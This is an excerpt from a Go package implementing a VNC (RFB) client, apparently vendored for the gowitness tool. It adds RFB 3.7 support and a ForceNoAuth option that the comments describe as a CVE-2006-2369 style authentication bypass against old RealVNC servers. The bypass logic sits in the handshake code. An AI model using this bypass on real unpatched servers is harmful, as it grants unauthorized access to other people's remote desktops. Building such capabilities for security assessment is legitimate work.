// Package vnc implements a VNC (RFB) client.
//
// This is a vendored copy of github.com/mitchellh/go-vnc (MIT license, see
// LICENSE in this directory) with two patches for gowitness:
//
//   - support for RFB 3.7 in addition to 3.8 (old RealVNC 4.1.0/4.1.1
//     servers negotiate at 3.7);
//   - a ClientConfig.ForceNoAuth option that sends RFB security type 1
//     (None) regardless of the types advertised by the server, implementing
//     the CVE-2006-2369 style authentication bypass against vulnerable
//     RealVNC servers.
//
// References:
//
...
type ClientConfig struct {
	...
	// ForceNoAuth, when true, sends RFB security type 1 (None) to the
	// server regardless of which security types it advertised. This is
	// the CVE-2006-2369 style authentication bypass against vulnerable
	// RealVNC 4.1.0/4.1.1 servers. Patched servers will close the
	// connection.
	ForceNoAuth bool
}
...
func (c *ClientConn) CutText(text string) error {
	...
	for _, char := range text {
		if char > unicode.MaxLatin1 {
			return fmt.Errorf("character %q is not valid Latin-1", char)
		}
...
func (c *ClientConn) handshake() error {
	...
	if maxMinor < 7 {
		return fmt.Errorf("unsupported minor version, less than 7: %d", maxMinor)
	}

	// Respond with the highest mutually supported version. Older RealVNC
	// servers (the targets of the CVE-2006-2369 bypass) advertise 3.7.
	negotiatedMinor := uint(8)
	if maxMinor < 8 {
		negotiatedMinor = 7
	}
	if _, err = c.c.Write([]byte(fmt.Sprintf("RFB 003.%03d\n", negotiatedMinor))); err != nil {
		return err
	}
	...
	var auth ClientAuth
	if c.config.ForceNoAuth {
		// CVE-2006-2369: send security type 1 (None) regardless of whether
		// the server advertised it. Vulnerable servers will accept; patched
		// servers will close the connection.
		auth = new(ClientAuthNone)
	} else {
	FindAuth:
	...
	// Per RFC 6143, the server only sends SecurityResult after None auth on
	// RFB 3.8+. On 3.7 with None, the server proceeds directly to ClientInit.
	if !(negotiatedMinor == 7 && auth.SecurityType() == 1) {
